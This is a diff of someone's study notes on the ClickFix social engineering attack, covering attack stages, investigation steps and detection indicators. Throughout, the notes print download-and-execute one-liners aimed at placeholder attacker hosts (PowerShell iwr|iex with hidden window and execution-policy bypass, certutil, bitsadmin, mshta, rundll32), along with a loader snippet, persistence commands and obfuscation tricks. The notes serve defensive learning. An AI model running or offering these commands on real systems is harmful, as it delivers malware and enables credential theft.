@@ -1,186 +1,260 @@
-Clickfix is a social engineering attack, where the attacker tricks the users into:
-  - Copying a command
-  - Pasting it into Run/Powershell/CMD
-  - Executing it Manually
+ClickFix:
+  ClickFix is a social engineering + script based attack, where the victim is tricked to copy-paste a command
+  (usually in Run/CMD/Powershell/Terminal) that downloads malware.
 
-Attack Flow:
+Instead of exploiting the software, attacker makes the user to execute commands itselves.
 
-Phishing Email / Web Page
+Typical lure:
+"Fix your PC"
+"Update browser"
+"Install codec"
+"Captcha verification"
+"Zoom audio fix"
+
+Victim copies command ==> runs it ==> Malware downloads.
+
+Clickfix AttackFlow (End-to-End).
+
+Website / Email lure
         ↓
-Fake Error Message ("Fix required")
+Fake instruction "Press Win + R"
         ↓
-Copy Command Button
+User pastes command
         ↓
-User opens Run / PowerShell
+PowerShell / CMD executes
         ↓
-Paste & Execute
+Payload downloaded
         ↓
-Payload Download
+Second stage executed
         ↓
-Loader Execution
-        ↓
-Persistence
-        ↓
-C2 Communication
-        ↓
-Credential Theft / Lateral Movement
+Persistence / C2 connection
 
-Command Breakdown:
-  powershell -w hidden -c "iwr hxxp://evil.site/a.ps1 | iex"
+Initial Access: user runs --> Powershell executes
+Press Windows + R
+Paste below:
+powershell -c "iwr http://malicious.site/file.ps1 | iex"
 
-| Part         | Meaning                           |             |
-| ------------ | --------------------------------- | ----------- |
-| `powershell` | Launch PowerShell                 |             |
-| `-w hidden`  | Hidden window (stealth)           |             |
-| `-c`         | Execute command                   |             |
-| `iwr`        | Download file (Invoke-WebRequest) |             |
-| `            | `                                 | Pipe output |
-| `iex`        | Execute downloaded content        |             |
+Powershell      ==> launches powershell
+-c              ==> runs command
+iwr             ==> Invoke-WebRequest (download file)
+|               ==> Pipe output
+iex             ==> Invoke-Expression (Execute)
 
-So:
-  Download + Execute in Memory (Fileless attack)
+Meaning ==> run"download .ps1" Execute.
 
-Commands to learn:
-
-Powershell download commands:
-iwr ==>   Invoke-webrequest
-Curl ==> Is a tool for transferring data from or to a server using URL's
-Wget ==> is a cmd tool, that can download files using HTTP,HTTPS,FTP & FTPS
-
-Execution Commands:
-iex ==> Invoke-Expression  ==> It takes a string & executes it as if it were a powersehll command.
-Start-Process ==> use to start the process
-
-Encoding (Obfuscation)
--enc
-FromBase64String
-
-Common Malware Delivered:
-- Lumma Stealer
-- RedLine Stealer
-- Vidar
-
-Detection Points:
-  - Powershell launched from browser
-  - Command line Suspicious
-  - Encoded Payload
-================================================
-Investigation Playbook:
-Initial Access:
-  - Email?
-  - Web?
-  - User manually ran command
-
-Check Commandline
-powershell -w hidden -enc ...
-Red Flags:
-- hidden
-- encoded
-- iex
-- download
-
-Decode Base64
-powershell -enc SQBFAFgA
-Decode to see real payload
-
-Check Network:
-  Look for 
-    - Sucupisicous domain
-    - IP
-    - Newly registered domains
-Check Persistence
-Check Payload:
-  Downloaded Exe, DLL, script?
-
- powershell -w hidden -enc JABXAGMAPQBuAGU...
-
-Decoded:
-
-$wc=new-object net.webclient
-$wc.downloadstring('http://evil.site/a.ps1') | iex
+Stage 1 Loader(Downloader)
+$u="http://site/payload.exe"
+Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
+Start-Process $env:TEMP\file.exe
 
 Meaning:
-➡️ Download script
-➡️ Execute in memory
+  Download payload.exe
+  write/save it to TEMP
+  Execute
 
-No file saved → stealth
-=================================
+Stage 2 Payload
+  This is real malware: Info stealer/RAT/Loader/Lumma/Redline/AsyncRAT
+
+Defense Evasion:
+  Clickfix often uses:
+    powershell -enc SQBtAHAA...
+  Encoded Base64 command
+
+String Splitting:  "po"+"wer"+"shell"
+Environment Varables:  $env:APPDATA
+Sandbox Evasion: ?token=unused
+    Purpose:
+        Only real user gets payload
+        Sandbox blocked
+        One-time download
+
+Analysis:
+  Identify Command:
+    Look for
+        Powershell/CMD/mshta/rundll32/curl/ditsadmin
+    Eg: mshta http://site/file.hta
+
+  Decode it encoded
+    Look for 
+        -enc
+        -base64
+    echo BASE64 | base64 -d
+
+    Extract URLs
+        Find http/https
+    These are: payload/C2/Staging
+
+Identify Download Method:
+  Common clickfix download comands:
+      Powershell: Invoke-Webrequest/IWR/curl/wget
+      CMD: certutil -urlcache -split -f / bitsadmin /transfer
+
+Look for Execution: Start-Process/iex/Cmd /c
+
+Clickfix eg:
+  powershell -w hidden -nop -c "iwr http://bad.site/a.ps1 | iex"
+
+Examples:
+powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex" ==> Powersehll
+Meaning:
+Run hidden PowerShell, ignore security, download script from internet, execute immediately.
+
+certutil -urlcache -split -f http://bad.site/file.exe file.exe    ==> CMD
+Meaning:
+Download malware using built-in tool.
+
+bitsadmin /transfer job http://bad.site/file.exe C:\Temp\file.exe
+mshta http://bad.site/file.hta (Attackers use JavaScript/VBScript/Downloader)
+rundll32.exe url.dll,FileProtocolHandler http://bad.site
+curl http://bad.site/file.exe -o file.exe
+wget http://bad.site/file.exe -OutFile file.exe
+
+-w hidden      ==> hide window (so, users dont see)
+-nop           ==> no profile (do not load PowerShell user profile & runs faster & avoid security scripts)
+iwr            ==> Invoke-Webrequest (download), same as curl/wget
+iex(Invoke-Expression) ==> Execute
+hidden         ==> Stealth
+-writeout      ==> Save/write to
+-ep bypass     ==> ExecutionPolicy bypass (Ignore Powershell security restrictions & allow unsigned scripts)
+-c ''          ==> run, what ever in ''
+|               ==> Pipe output, take output of first command & send it to next command, here download script & execute it immediately, Not saving file
+Certutil        ==> windows certificate utility(abused to download)
+cmd /c          ==> close command prompt
+-urlcache        ==> download file from URL
+-split          ==>split file into chunks
+-f              ==> Force overwrite
+bitsadmin        ==>  windows background downloader
+/transfer        ==> start download (used for stealth downloads)
+mshta            ==> Executes HTML Applications
+rundll32.exe    ==> open malicious URL/Executes DLL
+curl            ==> output file
+Start-Process file.exe  ==> Execute file.exe
+& file.exe      ==> Execute file.exe
+cmd /c        ==> Execute file.exe
 
 
-Most Important commands to Memorize:
-powershell -  Windows Powerful scripting shell
-Why Attackers use it:
-  Attackers use to download Malware
-  Runs scripts in Memory (Fileless Attack)
-  Bypass AV
 
-cmd - Basic Windows command prompt
-Why Attackers use it:
-  LAunch other tools
-  Chain commands
-  Execute payloads
 
-iwr - Invoke-WebRequest (Powershell command to download from Internet)
-Why Attackers use it:
-  Download Payload silently
-  Eg: iwr http://malicious.com/payload.exe
-Checks:
-  External URL
-  Suspicious domain
-  Download location
+Clickfix Variants:
+  1.  Multi-satge
+        Run ==> PS script==>HTA==>Exe
+  2. 7zip Portable drop
+      Purpose: Extract payload & Avoid AV detection
+  3. LOL(Living off the land)
+      Uses: mshta/regsvr32/rundll32
 
-curl - is a tool to transfer data from URL
-Why Attackers use it:
-  Download Malware
-  Eg: curl http://evil.com/file.exe -o file.exe
-Check:
-External IP
-Newly registered domain
-Suspicious file type
+DeviceProcessEvents
+| where InitiatingProcessFileName == "explorer.exe"
+| where FileName in ("powershell.exe","cmd.exe")
 
-wget - Another download tool (similar to curl) - download from internet
-Why Attackers Use it:
-Eg: wget http://attacker.com/backdoor.exe
-Pull payload from server
+Stage 1
+powershell -w hidden -nop -c "iwr http://site/loader.ps1 | iex"
+"Stage 2
+loader.ps1 downloads payload.exe
+Stage 3:
+payload.exe executed
+stage 4:
+C2 connection established
 
-iex - Invoke-WebRequest - Executes command as code.
-Run downloaded script directly in memory (fileless attack)
-iex (iwr http://evil.com/script.ps1)
-Check:
-Very suspicious combination:
-  iwr + iex
-  download + execute
 
-Start-Process - Launch another program
-  Run Payload quietly
-  Eg: Start-Process malware.exe
+Common clickfix Indicators:
+powershell
+iwr
+iex
+certutil
+bitsadmin
+mshta
+rundll32
+curl
+encoded command
+temp folder execution
 
-reg add - Adds registry key. [ Persistence-Run Malware at startup ]
-  Eg: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 
-schtasks - create scheduled task.
-        Run Malware every hr / on reboot
-    Eg: schtasks /create /sc minute /mo 30
+Parameter                	                    Meaning                                    	Why attacker uses
+powershell	                                    run PowerShell	                            execute script
+-w hidden	                                      hide window	                                stealth
+-nop	                                          no profile	                                faster
+-ep bypass	                                    bypass security	                            run unsigned
+-c	                                            run                                         command	execute
+iwr	                                            download	                                  payload
+iex	                                            execute	                                    run script
+-enc	                                          encoded	                                    obfuscation
+certutil	                                      download	                                  LOLBIN
+bitsadmin	                                      download	                                  stealth
+mshta	                                          execute                                     HTA	script run
+rundll32	                                      run                                         DLL	payload
+curl	                                          download	                                  payload
+wget	                                          download	                                  payload
 
-mshta - Runs HTA (HTML APplication)
-    Executes Remote script
-    Eg: mshta http://evil.com/payload.hta
 
-rundll32 - Runs DLL File.
-  Executes Malicious DLL Files.
-  Eg: rundll32 malware.dll,EntryPoint
-Check:
-  DLL path
-  User temp folder
-  Downloads folder
+BIG PICTURE:
+User runs command
+     ↓
+Stager (Stage 0)  ==> Very small script whos job is to download next stage.
+     ↓
+Loader (Stage 1)  ==> A Pgm/script that loads the real malware into memory/downloads additional component
+     ↓
+Stage 2 Payload  ==> Intermediate payload that setup environment before final malware
+     ↓
+Final Payload    ==>The Actual Malicious tool attacker wants to un
+     ↓
+C2 / Persistence
 
-Dangerous Combo:
-powershell + iwr + iex
-cmd + powershell
-mshta + URL
-rundll32 + temp folder DLL
-schtasks + persistence
-reg add + run key
+Loader vs stager:
+Type	                  Size                    	Role
+Stager	                very small	              download next stage
+Loader	                larger	                  prepare & run payload
+
+Memory trick:
+
+Stager = fetch
+Loader = launch
+
+Real ClickFix Multi-stage Example:
+Stage 0 - Stager (User runs)
+powershell -c "iwr http://site/1.ps1 | iex"
+Stage 1 - Loader
+1.ps1 downloads loader.exe
+Stage 2 - Setup
+loader.exe downloads payload.dll
+Final Payload
+payload.dll injected into explorer.exe
+
+VISIUAL FLOW:
+
+ClickFix command
+       ↓
+Stager (small script)
+       ↓
+Loader (downloads malware)
+       ↓
+Stage 2 (prepare system)
+       ↓
+Final payload (RAT/Stealer)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
